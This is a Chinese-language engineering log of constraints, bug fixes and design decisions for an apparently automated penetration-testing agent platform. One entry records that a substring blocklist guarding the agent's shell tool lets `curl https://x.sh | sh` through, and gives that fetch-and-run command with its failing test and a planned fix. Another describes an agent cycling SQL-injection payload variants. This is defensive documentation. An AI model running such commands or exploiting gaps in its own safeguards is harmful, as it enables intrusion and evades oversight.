# 硬性约束与红线

> 取自 `AGENTS.md`、`README.md`、项目实际配置。以源码为准，文档滞后即修正。

## 风险模块（谨慎修改）

| 模块/文件 | 风险说明 | 修改前必须 |
|-----------|---------|-----------|
| `pobi_v2/engine/executor.py` | 任务执行管线核心：分流 deadend/probe、落库、协作式取消、子 Agent 子超时、续跑、token 落库 | 完整追溯调用链；确认 cancel_state / ARQ 队列交互 |
| `pobi_v2/engine/deadend_runner.py` | M8 主路径适配层，驱动原 `DeadEndAgent` 完整多智能体 | 理解 `pobi_agent` 上游内核；改动需追溯上游 pobi |
| `pobi_v2/engine/event_bus.py` | 事件总线对接 `EventHooks` + 会话级 token 累计；SSE 数据来源 | 确认不影响 SSE 实时性与落库顺序 |
| `pobi_v2/engine/approval.py` | M5 审批引擎，fail-closed；按独立 `tool_call_id` 建 `ApprovalRequest` | 保持失败关闭语义，禁止默认放行 |
| `pobi_v2/engine/cancel_state.py` | 取消标志存储（memory/redis），协作式取消依据 | 勿破坏「取消后移除 ARQ 幽灵 job」逻辑 |
| `pobi_v2/main.py` | FastAPI 入口 + lifespan（事件钩子/seed/kali 就绪） | 启动顺序：install_event_hooks → persist_event_worker → seed_admin → ensure_shared_kali_ready（fail-fast） |
| `web/static/css/styles.css` 与 `styles-enhancements.css` | 详情页高度链脆弱；enhancements 后加载会覆盖 styles 同名规则（如 `.chat-stream`） | 改同名选择器须两文件一致，避免层叠冲突 |
| `pobi_v2/llm/` | 统一 LLM 抽象层，agent 内核与平台唯一 litellm 入口 | 新增 LLM 调用必须经 `complete/complete_json/chat`；禁止绕过统一层直连 litellm；异常归一与重试逻辑勿分叉 |

## 历史踩坑记录

- **[AVFS not mounted]** `DeadEndAgent` 以 `agent_id` 命名空间挂载 memory，子 Agent 须统一用 `memory_session_id` 访问；误用 `session_id`(task_id) 曾累计阻塞 131 次。修复点：`executor.py:113-115/:157`、`pobi_agent.py:438-440`。→ 读写 memory 必须用同一命名空间。
- **[function-call 序列化]** `parse_browser_steps` 兼容模型将 `steps` 字符串化（先 `json.loads` 解包 `{"steps":[...]}`），避免 `'str' object has no attribute 'items'`。
- **[认证死循环]** `wait_for_auth_success` 假阳性修复；`authenticate_service` 增加 `validated` 真实校验 + 连续失败熔断（`_AUTH_FAIL_LIMIT=3` 直接 `aborted`）。来源：监控报告 A/B（DVWA 登录 33 分钟死循环）。
- **[协作式取消残留]** 取消后任务仍 `running`：取消标志写入后主动从 ARQ 移除幽灵 job；子 Agent 执行包 `asyncio.wait_for` 子超时；Worker 每 5 分钟 `task-reconcile` 对账。来源：报告 C。
- **[SSE 终态重连]** 已结束/取消/失败任务（`completed`/`failed`/`cancelled`）打开详情时不应再建立 SSE 或无限重连；`app.js` 启动前判断状态 + `onerror` 判断终态不重连，否则 `ERR_INCOMPLETE_CHUNKED_ENCODING` 反复出现。
- **[前端详情页高度链]** 全局高度链 `console-root → console-body → console-shell → console-grid → col-center` 脆弱；media query `(min-height:761px)` 曾把 `.console-root`/`.console-grid` 设 `overflow:hidden` 导致整页无法滚动。修复：改 `overflow:auto`；对话流 `.chat-stream` 限高 `max-height:60vh; overflow-y:auto` 内部滚动，蜂群区自然拉长。

- **[RECON 同步链路断点（2026-08-27 修复）]** 原设计：worker 进程 `ContextEngine._recon_emit_sync` 经内存事件总线 `emit_recon_upsert` 推 `__recon_sync__` 事件，由 web 进程 `recon_sync_worker` 消费并 `upsert_to_pg` 到 PG 聚合层。但 agent 跑在 worker 进程、默认 `MemoryEventBusBackend` 不跨进程，事件丢失 → `recon_facts_agg`/`recon_threats_agg` 始终为空（历史任务全空）。**修复**：① `_recon_emit_sync` 改为同进程直连 `ReconStore.upsert_to_pg`（经 `asyncio.create_task`，`ContextEngine` 注入 `pg_session_factory`，由 `deadend_runner` 构造 `DeadEndAgent` 时经 `_async_session_factory()` 传入）；② `deadend_runner.run_deadend_agent` 的 `finally`（统一出口 `clear_task_root` 前）显式 `await upsert_to_pg` 兜底 flush，抗中断丢数据；③ 停用 `recon_sync_worker`（`event_bus.py` 标弃用空壳，`main.py` 移除启动）。另修复 `upsert_to_pg` 内 `source_tasks.op("||")` 对 JSON 列非法的 bug（PG 无 `json||json` 操作符），改为冲突时取 `excluded.source_tasks`。**约束**：改 `ContextEngine`/`ReconStore` 同步逻辑时必须保持同进程直连，勿退回跨进程事件总线；`pg_session_factory` 必须注入否则同步静默跳过。

- **[浏览器启动失败 + LLM 死循环（2026-08-28 修复）]** 任务 `535aee8e` 在登录步骤反复重试 `browser_run_steps` 至 30 分钟 job_timeout。根因有两层：① **binary 路径缺失**——`BrowserSession` 未向 Pydoll 注入 `binary_location`，Pydoll 默认只校验系统路径 `/usr/bin/google-chrome`，而 Docker 镜像仅预装 Playwright 自带 chromium（`PLAYWRIGHT_BROWSERS_PATH=0`），系统 chrome 不存在；② **容器内 root 需 `--no-sandbox`**——chromium 在容器内以 root 运行必须 `--no-sandbox`，否则进程立即退出、CDP 端口从不监听，Pydoll `_verify_browser_running` 超时。**另修复两个预存参数 bug**：`verify_ssl=False` 时 `add_argument("ignore-certification-errors")` 缺 `--` 前缀（被当成 URL 位置参数）；默认 user-agent 字符串 `AppleWebKit/537.36(KHTML` 缺空格。**修复**：`browser.py` 新增 `_find_chromium_candidate`（优先完整 chromium、回退 headless-shell/系统路径，模块导入时预探测缓存）+ `BrowserSession` 透传 `binary_location`；`_build_chromium_options` 加 `--no-sandbox`/`--disable-setuid-sandbox`、修正 `--ignore-certificate-errors` 与 user-agent。**约束**：① Pydoll 链路**必须**用完整 chromium（headless-shell 在 Pydoll 下报 `NoValidTabFound`，不保证默认 tab 发现），headless-shell 仅作回退；② 容器内浏览器参数**不得**移除 `--no-sandbox`；③ 用同步/文件扫描探测路径，禁止在 async 调用栈内用 `sync_playwright`（Playwright 明确禁止，且退出时 `TargetClosedError` 会覆盖返回值）。

- **[TaskEvent payload 双层嵌套（2026-08-28 修复）]** 任务详情页日志区出现大量「Iteration ? · 0 messages」「LLM Input · user」（空内容、不可点开详情）的无意义条目。根因：`#unify-event-structure`（commit 914422d）为 SSE 引入 `_wrap` 外层信封 `{type, session_id, payload:{...}}`，但 `persist_event_worker` 落库时仍整体存储 `dict(event)`（减去 type/session_id），导致 DB `TaskEvent.payload` 变成双层 `{"payload": {...}}`；而 `/plan`、`/live`、`/events` 与前端 `eventToChat` 全部按单层读取 `ev.payload.iteration/content/...`，解析不到 → 回放乱码。连带 `/plan` 步骤、`/live` 阶段/智能体/工具聚合全部为空。**修复**：`persist_event_worker` 改存 `event.get("payload") or {}`（单层），与 executor 直落 `agent_result` 口径一致。**约束**：`TaskEvent.payload` 永远只存内层字段（单层）；`_wrap` 信封仅用于事件总线/SSE 线上传输，落库与消费方均按单层处理，禁止再叠加外层。历史任务旧数据仍为双层，需回放/重跑或 SQL 解包回填才可见。

- **[取消残留：续跑不清 error/finished_at/cancel_requested（2026-08-28 修复）]** 任务 `535aee8e` 出现 status=running 但 `error="检测到取消请求，自动终止"`、`finished_at` 有值、`cancel_requested=t` 的矛盾状态。根因：`re_enqueue_task`（前端"继续"）仅把 status 改为 queued，**不清**上次终止遗留的 `error`/`finished_at`/`cancel_requested`（DB），也不调 `clear_cancel`（Redis 标志）。Redis 标志由 `run_task` 启动时 `clear_cancel(tid)` 兜底清除（故任务能续跑），但 DB 三字段残留导致 UI 显示矛盾，且 `cancel_requested` 永远为 True 可能误导前端"取消中"状态。**修复**：`re_enqueue_task` 续跑时重置 `error=None / finished_at=None / cancel_requested=False` 并提前 `clear_cancel(task.id)`（消除 queued→running 窗口期被对账误判为已取消的窗口）。**约束**：任何"重新入队/续跑"路径必须同时重置终止残留三字段 + Redis 取消标志，禁止只改 status。

- **[LLM 统一抽象层接入 agent 内核（2026-08-28）]** 硬性架构要求：**所有 LLM 交互必须统一走 `pobi_v2/llm` 抽象层**，agent 内核不再直连 litellm。worker 与 api 为同一镜像（`pobi_v2:1.0.0`），容器内均有完整 `pobi_v2` 代码，故采用**代码层收敛**（core_agent 惰性 import `pobi_v2.llm`），不做 HTTP 切割。**改造**：① `core_agent.py` 移除 litellm/acompletion/instructor 直连与自身 tenacity 重试，`_call_llm_with_retry`/`_extract_structured`/`_extract_structured_manual` 全部改走统一层（`complete`/`complete_json`，消息以 OpenAI 原生 dict 透传，新增 `_build_model_spec` 把内核 model/api_key/base_url 构造成 `ModelSpec`）；② 统一层扩展 `LLMRequest.tools` + `LLMResponse.thinking_content/tool_calls`，`complete` 支持 function calling 与 json_mode；③ **异常归一**：统一层 `_normalize_error` 把 litellm 异常分类为内核 `pobi_agent.core_agent` 异常（ContentPolicy→InvalidRequest / Quota / RateLimit / Auth / ModelNotFound / Connection / InvalidRequest / LLMError），tenacity 重试作用于归一后的可重试类型（RateLimit/Connection），避免函数内包装后重试条件失效；④ core_agent 保留 `_emit_llm_error_event` 补发 CLI 可见错误事件。**约束**：① 禁止在 pobi_agent 任何位置直连 litellm（embedding 的 `aembedding` 除外，`models/registry.py`）；② core_agent 对 `pobi_v2.llm` 必须**函数内惰性 import**（`core_agent/__init__.py` 顶层引 CoreAgent，顶层互相 import 会循环）；③ 平台侧统一层调用方已确认均用宽泛 `except Exception`，异常归一为内核异常不破坏兼容；④ `LLMRequest.messages` 兼容 `LLMMessage` 与 OpenAI 原生 dict 两种输入。

- **[子 agent 死循环熔断 + 足迹驱动收敛（2026-08-31）]** 任务 `535aee8e` 中 requester 死磕 `UNION SELECT`，被目标连接重置（connection reset）拦截后不断换 payload 变体，**子 agent 内部**迭代 50 轮不收敛，最终被 `_AGENT_SUB_TIMEOUT`（30min）熔断 `failed`（烧 1600 万 token 零产出）。**根因**：supervisor 提示词"每端点最多 2 次调用"只约束**委派层**，管不到子 agent（requester）内部 LLM 循环；且 `asyncio.TimeoutError` 的 `str()` 为空，熔断后 `tasks.error` 落库空字符串，事后无法定位。**方案**：不限攻击轮数（保住绕过能力），改"尝试留痕 + 主控证据驱动收敛"。**实现**：① `RequesterDeps` 注入 `context`（TYPE_CHECKING 防循环依赖）→ `pw_send_payload` 每次请求实时 upsert `recon_techniques`（**name 必须含 endpoint 前缀** `"{endpoint} | {payload摘要} [{sha1:8}]"`，同 payload 幂等合并计数，成功/失败/connection reset 均记）；② 接通 `was_already_attempted` 防重复（同 payload 已失败即提示换变体）；③ 新增 `ContextEngine.is_surface_dead(endpoint, threshold=10)` **死路硬护栏**：同攻击面失败 >=10 且无成功 → `pw_send_payload` 直接返回 BLOCKED 拒绝继续；④ 新增 `ReconStore.list_techniques` + `ContextEngine.get_failed_footprint_summary`，supervisor 决策与 requester 委派前注入 "Failed Attempt Footprints" 摘要，prompt 规则：失败 >=5 且无新信息视为死路转向；⑤ `pobi_v2/engine/executor.py` 超时分支显式 `raise TimeoutError("DeadEndAgent 子超时熔断…")` 补错误描述。**约束**：① 工具层足迹写入必须旁路 no-op（context 未注入时安全跳过，异常仅 warning 不阻断请求）；② `recon_techniques` 的 name 前缀必须带 endpoint，否则主控无法按攻击面聚合；③ 死路硬护栏阈值默认 10，防止误伤正常多轮绕过。

- **[PG 增量同步 + 资产聚合表（2026-08-31）]** 原 `upsert_to_pg` 每次被旁路写入触发时**全量**读本地 recon 五表全量 upsert，任务高频写入时 create_task 并发堆积有性能压力；且 `recon_endpoints`（端点/资产）从未进 PG，目标全景图缺资产视图。**改造**：① 本地 `recon_facts`/`recon_endpoints`/`recon_threats` 三表加 `pg_synced_at` 脏标记列（NULL=脏），旧库 `_ensure_column` 幂等 `ALTER TABLE ADD COLUMN` 补齐；② 四个 upsert（fact/endpoint/technique/threat）更新已有行时自动置脏；③ `upsert_to_pg` 只读脏行 → PG upsert → **PG 提交成功后**打标（失败不打标，下次重试不丢数据）；④ `_recon_emit_sync` 改 per-task in-flight 合并（同步期间新写入标记 `_recon_sync_pending` 补一轮），不再每次写入 create_task；⑤ 新增 PG 资产聚合表 `recon_endpoints_agg`（`pobi_v2/db/recon_models.py` + alembic `0017_recon_endpoints_agg.py`），`seed_from_pg` 续扫时从该表灌入本地结构化端点；⑥ 新增 `GET /api/v1/targets/{id}/assets` 返回目标资产清单。**顺带修复收敛 bug**：原 `on_conflict_do_update` 用 `where=excluded.confidence > current` 整行门控，导致同键内容更新但置信度未提升时 PG 静默过期；改为**内容字段最新 wins + confidence 取 `GREATEST(旧,新)`**。**约束**：① 任何"更新已有行"的写入路径必须置脏 `pg_synced_at=NULL`，否则增量同步漏更新；② 打标必须在 PG 提交成功后执行（失败不打标，靠脏标记重试）；③ 新本地库建表含 `pg_synced_at`，旧库依赖 `_ensure_column` 幂等补列，禁止删该列。
- **[前置侦查数据模型：tx 单一真源 + 端点派生（2026-09-02）]** 修复 `upsert_to_pg` 在取消任务场景下因同 `(method,url)` 多脏行撞 PG `recon_http_transactions_agg` 唯一键 `CardinalityViolation`。**数据模型铁律**：① `recon_http_transactions` 为**唯一真源**（append-only 流水，保留多次观测，如 katana 匿名 403 vs requester 带 cookie 200 的认证差异），禁止任何路径直写 `recon_endpoints` 制造双写；sitemap(`persist_sitemap`)/指纹(`persist_fingerprint`)/运行期(`ContextEngine.add_recon_endpoint`) 只写 tx 流水，端点树统一由 `ReconStore.derive_endpoints_from_transactions` 从 tx 按 `(host, path_normalized)` 派生（状态择优 2xx>3xx>4xx>5xx、tech_stack/params 并集、auth_required 任一真、多观测差异记 notes）；② pre_recon 落库后必须调用派生入口刷新 `recon_endpoints`；③ `ReconStore.build_site_overview` 从 tx **读时现算**站点总览（不落物化表），由 `build_index_view` L0 与 `build_baseline_block` 消费；④ **seed-out 折叠约束**：`upsert_to_pg` 写 PG 前必须按 `(method,url)` 折叠 tx 脏行（取最新 id 代表），折叠的全部脏行统一打 `pg_synced_at`，否则同命令重复冲突键必现 `CardinalityViolation`；⑤ **seed-in 必须随生产主链路触发**：`deadend_runner` 任务启动、pre_recon 完成后、`threat_model` 前调用 `seed_from_pg` + `seed_local_artifacts`（失败仅 warning），原仅 ADaPT `start_supervisor` 分支触发导致历史沉淀无法续扫；⑥ supervisor 启动 prompt 经 `build_baseline_block` 注入侦察基线（token 预算 2000），使 Layer1 在运行期前即生效。

- **[`_is_safe_shell` 词法解析漏洞（2026-08-31 记录，暂未修复）]** `pobi_v2/engine/scan_tools.py` 的 `_is_safe_shell` 用**静态子串黑名单**做极简防护，存在绕过：黑名单 `"curl | sh"`/`"wget | sh"` 要求两个词紧邻，而 `curl https://x.sh | sh`（URL 隔断）无法命中；随后命中白名单前缀 `"curl"` 被判定安全 → **`curl <任意URL> | sh` 可绕过第一层防御**。证据：`tests/test_engine_tools.py::test_unsafe_shell_blocked[curl https://x.sh | sh]` 失败（期望拦截、实际放行）。**已知影响范围**：该工具属 `ScanWorkflow`（无 Docker 沙箱的轻量回退路径）的基础防护层，真实高危命令仍会被 `engine/approval.py` 审批 gate 二次拦截，故当前不构成直接利用面，但防御纵深第一层已静默失守。**修复方向（待实施）**：改用 `shlex.split` 词法解析，检测「下载类命令（curl/wget）+ `|` 管道 + `sh`/`bash` 解释器」组合，替换子串匹配；同时补充带 URL 中间隔的用例到测试参数化列表。**约束**：修复时不得破坏 `ScanWorkflow` 对合法只读探测命令（curl/wget 直连等）的放行语义。

- **[本地任务目录生命周期：删除目标残留 + 探针空目录（2026-09-01 修复）]** 宿主 `~/.pobi_v2/tasks/` 堆积 46 个任务目录而 DB 仅 19 条 task，其中 40 个为孤儿（9.4M）。**根因两层**：① **删除目标不清理本地目录**——`delete_target`（`routers/targets.py`）只 `session.delete(target)`，本地产物目录按 `task_id` 组织（`TASKS_ROOT/<task_id>/`，非按 target），不会随目标级联删除消失；而单任务删除 `delete_task` 一直会调 `delete_task_local_data`，两条删除路径行为不一致。② **探针（probe）空目录**——`probe_runner.run_probe_agent` 的 `task_root.mkdir` 是 2026-08-18 提交 `65fd07b`（统一目录归口）引入，但探针路径**不写任何文件**：只在共享 Kali 内执行一次 curl + 一次 LLM 解读（结论写回 `Task.result`），token 仅内存累计（`emit_llm_response` 不落盘）；所有 `get_task_root()` 写入点（`python_interpreter`/`browser_automation`/`context_engine`/`session_metrics`/`auth_resolver`）都属 DeadEndAgent 主路径，探针不触达 → 每次探测留下一个空目录（2026-08-15 的历史 probe 因早于该提交，故无目录，曾造成"探针不生成目录"的误判）。**修复**：① `delete_target` 在 `session.delete` **前**先取 `task_ids`（级联删除后 ORM 关系被清空，无法再取），提交后逐个 `delete_task_local_data`，与单任务删除一致；② 探针 `finally` 中 `clear_task_root` 后调 `_cleanup_probe_task_root`，**空目录直接 `rmdir`；非空则保留并记 warning**（避免静默丢弃未来扩展的意外写入），清理失败仅记日志不阻断结论。**约束**：① 任何新增的"删除实体"路径，若该实体下挂会产生本地目录的子资源，必须同步清理，禁止只删 DB 记录；② 本地目录按 task_id 归口，不随 target 级联消失，清理必须显式逐个进行；③ 探针保持"不落本地产物"语义——若未来扩展让探针触达 `get_task_root()` 写入点，产物仍应落在 `tasks/<task_id>/`（勿回退废弃旧根），并由清理逻辑保留非空目录告警供排查。

- **[模板加载器包名错写 + fallback 路径错位，任务秒败（2026-09-01 修复）]** 新建任务运行 0.1~0.2s 直接 `failed`，DB `tasks.error='supervisor.instructions.jinja2' not found in search path: '/app'`。**根因**：提交 `a78523a`（重写提示词模板）把 `pobi_prompts/template_renderer.py` 两处 `PackageLoader("pobi_prompts","")` 改成 `PackageLoader("deadend_prompts","")`（移植来源 deadend 项目的旧包名，本项目无此包）→ PackageLoader 抛 ImportError → 回退 `FileSystemLoader(package_root)`，而 `package_root = dirname(dirname(abspath(__file__)))` 算出 `/app`（`__file__` 在 `/app/pobi_prompts/`），模板实际在 `/app/pobi_prompts/` 下 → searchpath 错位找不到模板。旧代码 `PackageLoader("pobi_prompts")` 一直命中、fallback 从未执行，掩盖了 fallback 路径也是错的隐藏 bug。**修复**：① 两处包名改回 `"pobi_prompts"`；② fallback 的 `package_root = os.path.dirname(current_dir)` 改为 `package_root = current_dir`（模板/tools/_shared 都在 pobi_prompts/ 目录内，FileSystemLoader 应以该目录为根），根治 fallback 路径。**附带修复**：`pobi_v2/routers/tasks.py` 的 `_background_auto_auth` 两个 NameError——`async with SessionLocal()` 应为 `AsyncSessionLocal`（函数内只 import 了后者）；文件只有 `import logging` 未定义 `logger`（第 179/217 行活跃引用），补 `logger = logging.getLogger(__name__)`。**约束**：① `template_renderer.py` 的 PackageLoader 包名必须与真实包名（`pobi_prompts`）一致，禁止引用不存在的迁移来源包名；② FileSystemLoader fallback 的 searchpath 必须指向模板所在目录自身（`current_dir`），禁止 `dirname` 上跳；③ `tasks.py` 等 router 文件凡用 `logger` 必须显式 `logging.getLogger(__name__)`，异步会话一律用 `AsyncSessionLocal`。验证：容器内 `render_agent_instructions` 全量模板 + `render_tool_description` 渲染通过，`tests/ -k "preauth or probe or template or render"` 29 项通过。

## 目录结构约定（agent 产物路径）

- **[扁平化：去掉 agent_id / session_id 嵌套层]** 任务级 agent 产物统一归口到
  `tasks/<task_id>/agent/<子目录>/`，**不再嵌套 `<agent_id>/<session_id>` 两层**。
  各产物目录现状（2026-08-27 改造后）：
  - `auth_context/`：认证状态（按 target 的 profile 名隔离，复用 `auth_context/index.json`）
  - `run_context/`：运行上下文快照
  - `webpages/`、`_chunks/`：浏览器抓取页面
  - `memory/`：子 Agent 记忆总结
  - `workspace/`：agent 写入产出
  - RAG 索引：`tasks/<task_id>/rag/<embedding_session_id>/`（**保留 session 层**，RAG 按 task 隔离、跨 agent 共享）
- **决策依据**：原 `agent_id` 是单机固定 ID（`Config.get_local_agent_id`，所有任务相同，无隔离价值）；`session_id` 在当下实现中 == task_id，与外层 `tasks/<tid>` 重复。两层均不参与真实隔离/查找（认证按 target 隔离、运行上下文按 task 隔离）。**后续若需多 agent 协作共享认证，仅在 `auth_context` 处重新引入 `agent_id` 层即可。** 涉及改动文件：`auth_resolver.py`、`context_engine.py`、`code_indexer.py`、`pw_requester.py`、`rag/session_manager.py`、`pobi_agent.py`（`_prepare_memory_workspace` / workspace 默认根）。
- **历史兼容（已迁移，2026-08-27）**：原先嵌套在 `tasks/<tid>/agent/<agent_id>/<tid>/...` 的历史任务目录，已于本日统一**上移扁平化**：
  - `535aee8e-...`（`agent/02c1a686.../535aee8e.../{auth_context,memory,run_context,webpages,workspace}` → `agent/{...}`）
  - `bbd4d941-...`（`agent/02c1a686.../bbd4d941.../auth_context` → `agent/auth_context`）
  - 另清理一个遗留空壳目录 `02c1a686-ca84-474e-bb8c-70a1d90eb5a3/`（旧 agent_id 被误当任务目录，仅含一个 metrics.json，无 `agent/` 结构、无 `.db`），已删除。
  - 全量扫描确认：所有 48 个任务下 `agent/` 均无 `<uuid>` 嵌套残留。
  - 新任务全部走扁平路径，无需再兼容旧嵌套。`auth_context/index.json` 若记录旧路径属元数据、下次认证会自动重建，不影响目录结构。JSON 元数据里的 `agent_id`/`session_id` 字段保留（记录身份，不影响目录结构）。

## 设计取舍记录

- **[认证前置 PreAuth（2026-09-01 落地；**其中手动分支于同日搁置**）]** 任务创建阶段完成登录，为 L0 认证后爬取与 exploitation 提供会话。**设计决策**：① 自动分支复用原生 `authenticate_service`（无主控调度、无 LLM 决策）**并已生效**；手动分支（封装 `BrowserSession` 截图轮询 + 指令驱动）**已搁置，未启用**；② 会话落盘走原生 `AuthContextHandler` 三件套（`{profile}.json + {profile}.playwright.json + index.json`），**不新增 auth_meta.json**；来源/状态标记写入 `AuthContext.metadata`（source=preauth_auto/preauth_manual）；③ **防覆盖靠 profile 名隔离**——前置认证写专用 profile `preauth`，原生 AuthAgent 用自有 profile，`save_context` 按 profile 覆盖故文件级天然不冲突；唯一代码改动是 `authenticator.instructions.jinja2` 注入"已有 preauth 会话优先 validate 复用"引导；④ **凭据不落库（2026-09-02 强化）**：`tasks.auth_secret` 列已删除（alembic 0019），密码仅写入任务目录钱包 `tasks/<task_id>/reusable_credentials.json`（`CredentialsStore.save_credentials`，0600），供 authenticator 重认证消费；`auth_username` 保留 DB 用于展示（非高敏）；⑤ 手动浏览器 10 分钟超时自动销毁（`ManualAuthSession.expired`），会话严格 task 隔离；⑥ 认证结果写 recon_facts（category=authentication），经 L0/L1 上下文注入下游；⑦ MFA/验证码启发式归类 `auth_status=mfa`，降级提示人工分支，不阻塞任务创建与 L0 基线。**约束**：① 前置认证**不得**作为唯一会话载体使用滚动文件 `playwright_state.json`（pw_requester 每次请求覆盖），持久会话只认 `{profile}.json / {profile}.playwright.json`；② ~~手动分支 `ManualAuthSession` 为**进程内注册表**（`_MANUAL_SESSIONS`）~~ **手动分支已搁置（2026-09-01）**：`ManualAuthSession` 及注册/获取函数在 `preauth.py` 中**整体注释保留**（`:9` 注明"已禁用，2026-09-01 搁置"），`routers/task_auth.py` 的 5 个 manual 端点已移除（该文件现仅 `GET /auth/status`、`POST /auth/auto`），`webapp/src/api.js` 对应调用标注 `[DISABLED 2026-09-01]`，`tests/test_preauth.py` 相关用例已注释；**残留待清理**：`webapp/src/pages/Tasks.jsx:557` 的 `auth_mode === 'manual'` 分支与 `components/AuthPanel.jsx`（清理待办见 `roadmap.md`）。**重启该分支时**须先解决多 worker 下进程内注册表失效问题（改 Redis / 共享存储），否则多副本部署不可用；③ 浏览器操作沿用容器内 chromium + `--no-sandbox`（历史踩坑 2026-08-28）；④ auth 端点均走 `require_scope("tasks:write/read")` + 租户隔离。
- **[任务级凭据钱包（2026-09-02 落地）]** 凭据属于**不可复用资产**（登录态会失效，仅任务运行期有效），因此**从头到尾不落任何数据库**（pgsql/sqlite），仅写任务目录文件。**设计**：① `CredentialsStore` wallet 路径**动态解析**——`storage_context` 注入 task_root 时读 `tasks/<task_id>/reusable_credentials.json`（任务钱包，优先），否则回退全局 `~/.pobi_v2/reusable_credentials.json`（CLI/手动维护）；② `CredentialsStore.save_credentials(target, profile, ...)` 新增写入方法（写任务钱包，0600 chmod）；③ 创建任务（auth_mode=auto）时 `save_task_credentials` 把 username/password/login_url 写任务钱包（`tasks.py`）；④ authenticator 重认证时 `CredentialsStore.resolve(target, 'preauth')` 在 task_root 注入下读任务钱包拿密码 → **自动重认证闭环打通**（此前缺口：密码只在 DB 且 agent 拿不到）；⑤ `POST /auth/auto` 凭据回退从 DB 解密改为任务钱包 resolve；⑥ recon_facts 的 authentication 事实**不再携带 username**（凭据不落 recon sqlite）。**约束**：① 密码明文只出现在：创建请求体（内存）→ 任务钱包文件（磁盘，0600）→ 运行中内存，**绝不允许写回 DB**；② 任务级 wallet 不得作为全局共享凭据池（全局 wallet 仅 CLI 手动维护用）；③ 认证事实（auth_profile/auth_status 等非敏感元数据）仍可落 recon，但不得含 username/password；④ 新增任何"凭据落库"代码即违反本约束。
- **[创建前凭据预检 verify-auth（2026-09-01 增量）]** 用户配置账号密码后先真实登录一次，凭据错误不允许发放任务。**设计**：① 独立端点 `POST /api/v1/tasks/verify-auth`（**无 task_id 依赖**——任务未创建），输入 target_id+明文凭据，校验授权范围后跑 `verify_credentials`；② `verify_credentials`（`engine/preauth.py`）用**一次性临时目录**（`tempfile.mkdtemp`）+ **唯一临时 profile**（`verify_<uuid8>`）跑 `authenticate_service`，验证结束 `rmtree` 清理，**不落盘会话、不污染 `_auth_fail_counter` 熔断计数**（临时 profile 天然隔离）；③ 结果归类：success→valid、mfa/aborted→需人工（放行创建）、failed→凭据错误（前端阻止）、error→验证异常；④ 端点整体超时 45s（`asyncio.wait_for`）→ 504；⑤ **创建门禁在前端**：auto 模式必须先「验证凭据」，`failed` 时创建按钮拦截；MFA/aborted 放行（走手动分支）；`create_task` 后端保持宽容（后台认证失败记 `auth_status=failed` 不阻塞，因 MFA/无需登录也合法）。**约束**：① 明文密码仅存在于验证请求体，**不落库、不打日志**；② 验证结果仅反馈前端，不写 recon_facts（任务未创建）；③ 凭据/登录地址变更时前端必须重置验证状态（`setAuthField` 触发），防止旧验证结果误导；④ 若未来要后端强制，须区分"凭据错误"（可拒绝）与"MFA/无法自动登录"（必须放行），禁止一刀切拒绝。
- **[authenticate_service auto_submit 自动填表登录（2026-09-01 修复）]** 根因：`verify_credentials`/`run_auto_auth` 直接调 `authenticate_service` 时**未传表单 steps**（LLM 场景由模型生成），浏览器仅导航到登录页即停，且 `wait_for_auth_success` 无显式成功条件时**刻意返回失败**（2026-08-28 防假阳性修复）→ 验证恒报"账号或密码错误"。**修复**：`authenticate_service`/`_authenticate_via_browser` 新增 `auto_submit: bool=False`（**默认 False，LLM 路径零影响**；preauth 两分支显式传 True）；`_auto_submit_login` 用 JS 自动定位账号/密码输入框填充提交，启发式判定成功（URL 离开登录页且无 password 框 / 出现新会话 cookie），失败判定（错误提示文案 `.error/.alert` 等，正则含 `i` 标志）+ 超时兜底。**Pydoll 关键坑**：① `execute_script` 对箭头函数表达式 `() => ({...})` 报 `RuntimeError: Uncaught`——必须用**多语句 + return** 语句块风格；② 返回**对象**退化为 `objectId`，`_unwrap_evaluate` 只读 `value` → 返回 None——必须 `JSON.stringify` 返回字符串再由 Python `json.loads`；③ 布尔/字符串返回值正常。**约束**：① 填表/错误检测脚本必须保持多语句 + JSON 字符串返回风格，禁止用箭头函数对象字面量；② 用户名/密码经 `json.dumps` 生成 JS 字面量嵌入（模板 `{username}/{password}` 占位），禁止直接 f-string 拼接（注入风险）；③ auto_submit 仅作用于非 popup 的 form/http 浏览器流程，popup/LLM steps 路径保持不变；④ 验证（verify）与会话落盘（run_auto_auth）严格分离：verify 用临时目录用完即清，任务创建后才在 `tasks/{id}/agent/auth_context/preauth.*` 正式落盘。
- **[task_auth 手动登录 MissingGreenlet + SSE UUID 序列化（2026-09-01 修复）]** 手动登录与任务详情页实时流两个运行时 Bug：① `task_auth.py` 的 `_load_task` 只 `session.get(Task, task_id)` **未 eager load `Task.target`** → `manual/start`/`capture`/`auto` 访问 `task.target.url` 触发 async lazy-load 抛 `MissingGreenlet` → 500（任务详情页显示"失败"）。修复：`session.get(..., options=[selectinload(Task.target)])`；② `stream.py` snapshot 首帧 `json.dumps({"task_id": task_id, ...})` 用 **UUID 对象**（路由参数，非 `task_id_str`）→ `TypeError: Object of type UUID is not JSON serializable` → SSE 长连接崩溃、前端"实时流未连接"。修复：改用 `task_id_str`（line 57 的事件 payload 已有 `default=str` 兜底不受影响）。**约束**：① 任何 async 端点访问 Task→Target 关联，`session.get` 必须带 `selectinload(Task.target)`（沿用 tasks.py 既有模式）；② SSE/JSON 序列化涉及 task_id 一律用 `str(task_id)` 后的字符串，禁止直接塞 UUID 对象。
- **[webapp_fingerprint 指纹识别工具（2026-09-01 落地，2026-09-01 改版为前置侦查）]** 侦察阶段只读工具，一次调用产出四层结构化指纹（server/backend/frontend/cms+waf）并落库。**设计决策**：① 指纹库借 EASY233/Finger `library/finger.json`（648 条 cms 规则）+ 自建 28 条基础 WAF 规则（Cloudflare/阿里云盾/百度云加速/腾讯云WAF/360网站卫士/安全狗/雷池/ModSecurity/F5/Imperva 等），存于 `pobi_agent/tools/fingerprint/data/fingerprints.json`；② **不 vendor Finger.py**（批量+xlsx 输出形态与 agent 工具不符），自研轻量匹配引擎（keyword 多词 AND / faviconhash mmh3 / regula 正则），HTTP 层复用 aiohttp，favicon 哈希同款算法 `mmh3.hash(base64.b64encode(icon_bytes))`；③ **改版为前置侦查（2026-09-01）**：指纹识别归平台层自动通道 `pobi_v2/engine/pre_recon.py`，任务启动后智能体侦查前自动执行，**不再作为 requester 的 agent 工具**（已从 request_agent.py 装配、tools/__init__ 导出、描述模板中移除；`webapp_fingerprint` 保留为引擎薄封装仅供测试/显式调用）；核心逻辑收敛到 `pobi_agent/tools/fingerprint/engine.py`（`run_fingerprint` 无 ctx 引擎 + `persist_fingerprint` 落库）；④ 认证感知：读取 PreAuth 落盘的 `preauth` 会话注入 